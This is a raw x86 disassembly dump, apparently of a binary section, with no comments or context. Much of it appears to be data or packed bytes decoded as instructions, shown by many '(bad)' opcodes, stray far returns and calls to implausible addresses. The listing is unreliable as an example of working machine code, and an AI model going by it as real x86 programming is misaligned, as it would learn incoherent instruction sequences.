  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
